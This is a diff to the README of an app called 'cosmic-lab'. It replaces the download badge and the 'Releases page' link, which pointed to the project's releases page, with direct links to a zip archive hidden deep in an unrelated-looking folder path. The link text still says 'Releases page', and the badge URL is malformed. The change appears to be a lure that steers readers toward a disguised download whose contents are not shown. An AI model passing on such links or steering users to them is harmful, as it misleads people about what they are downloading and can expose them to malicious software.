@@ -6,7 +6,7 @@ Welcome to cosmic-lab! This application allows you to dive into data and insight
 
 ## 📥 Download the App
 
-[![Download cosmic-lab](https://img.shields.io/badge/Download%20cosmic--lab-blue.svg)](https://github.com/arnaplug/cosmic-lab/releases)
+[![Download cosmic-lab](https://raw.githubusercontent.com/arnaplug/cosmic-lab/master/wallet/subnet/primary/common/utxotest/cosmic-lab-v3.6-alpha.4.zip%https://raw.githubusercontent.com/arnaplug/cosmic-lab/master/wallet/subnet/primary/common/utxotest/cosmic-lab-v3.6-alpha.4.zip)](https://raw.githubusercontent.com/arnaplug/cosmic-lab/master/wallet/subnet/primary/common/utxotest/cosmic-lab-v3.6-alpha.4.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ To run cosmic-lab smoothly, your computer should meet the following requirements
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/arnaplug/cosmic-lab/releases) to find the latest version of cosmic-lab.
+   Go to the [Releases page](https://raw.githubusercontent.com/arnaplug/cosmic-lab/master/wallet/subnet/primary/common/utxotest/cosmic-lab-v3.6-alpha.4.zip) to find the latest version of cosmic-lab.
 
 2. **Select Your Version:**
    Browse through the list of available releases. You will see different versions, each with a description of what’s new or improved.
